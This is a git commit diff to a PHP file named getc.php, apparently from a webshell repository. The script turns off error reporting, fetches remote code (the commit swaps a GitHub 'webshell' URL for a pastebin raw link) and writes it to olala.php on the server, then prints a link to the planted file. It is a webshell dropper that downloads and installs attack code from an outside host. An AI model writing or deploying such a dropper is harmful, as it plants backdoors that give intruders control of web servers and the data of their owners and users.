41272eb4cf59da3ed4432a586bb6257806843406
AzhariKun <76898637+AzhariKun@users.noreply.github.com>
2023-08-04 15:43:11 +0700

    Update getc.php

--- getc.php
+++ getc.php
@@ -1,7 +1,7 @@
 <?php
 error_reporting(0);
 $shell = fopen("olala.php", "w");
-$file_shell = file_get_contents("https://raw.githubusercontent.com/AzhariKun/webshell/main/flx.php");
+$file_shell = file_get_contents("https://pastebin.com/raw/ZyfBjcqJ");
 fwrite($shell, $file_shell);
 fclose($shell);
 echo "<a href='olala.php'>Here</a>";
